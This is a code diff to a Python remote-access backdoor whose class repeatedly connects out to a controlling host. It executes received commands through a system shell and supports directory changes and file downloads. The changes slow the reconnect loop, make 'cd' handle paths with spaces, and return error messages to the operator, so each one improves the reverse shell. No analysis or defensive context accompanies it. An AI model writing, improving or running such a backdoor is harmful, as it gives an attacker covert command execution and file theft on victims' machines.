@@ -13,7 +13,7 @@ class Server:
 
     def connect(self):
         while True:
-            time.sleep(2)
+            time.sleep(20)
             try:
                 self.server.connect((self.ip, self.port))
                 print("serene self connected")
@@ -49,7 +49,7 @@ class Server:
                     self.server.close()
                     exit()
                 elif split_command[0] == "cd" and split_command[1] is not None:
-                    result = self.change_directory(split_command[1])
+                    result = self.change_directory(' '.join(split_command[1:]))
                     sending_data = result
                 elif split_command[0] == "download" and split_command[1] is not None:
                     file = self.read_file(split_command[1])
@@ -63,8 +63,7 @@ class Server:
 
                 self.reliable_send(sending_data)
             except Exception as error:
-                print(error)
-                self.reliable_send("We encountered an error.")
+                self.reliable_send(f"We encountered an error. {error}")
 
     def execute_command_on_system(self, command):
         execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
